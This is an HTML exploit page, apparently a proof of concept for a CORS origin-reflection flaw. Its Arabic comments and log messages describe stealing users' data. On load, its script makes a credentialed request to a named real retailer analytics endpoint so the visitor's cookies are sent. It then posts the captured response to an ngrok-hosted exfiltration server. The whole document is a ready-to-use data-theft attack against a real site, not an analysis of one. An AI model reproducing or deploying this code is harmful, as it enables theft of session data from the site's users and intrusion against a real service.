<!DOCTYPE html>
<html>
<head>
    <title>Critical PoC - Open CORS Bridge</title>
</head>
<body style="background: #000; color: #0f0; font-family: monospace;">
    <h1>[!] CORS Reflection Exploit</h1>
    <div id="logs">جارٍ بدء سحب البيانات من الجسر...</div>

    <script>
        const target = "https://stm.zooplus.com/g/collect?v=2&tid=G-WQGMZ03HML&en=page_view&_s=1";
        const exfilServer = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/exfil";

        async function exploit() {
            try {
                // المتصفح سيرسل تلقائياً Origin: https://egyhaker.github.io
                // وبما أن السيرفر "يعكس" أي Origin، سيرد بالموافقة!
                const response = await fetch(target, {
                    method: 'GET',
                    credentials: 'include', // إرسال كوكيز zooplus.com (sid, cid, csrf)
                });

                const data = await response.text();
                
                // إرسال البيانات المسروقة لسيرفرك
                await fetch(exfilServer, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        leak: "Success",
                        origin_used: window.location.origin,
                        captured_content: data
                    })
                });

                document.getElementById('logs').innerHTML += "<br>[✅] تم سحب البيانات وإرسالها للسيرفر!";
            } catch (e) {
                document.getElementById('logs').innerHTML += "<br>[❌] خطأ: " + e.message;
            }
        }

        exploit();
    </script>
</body>
</html>
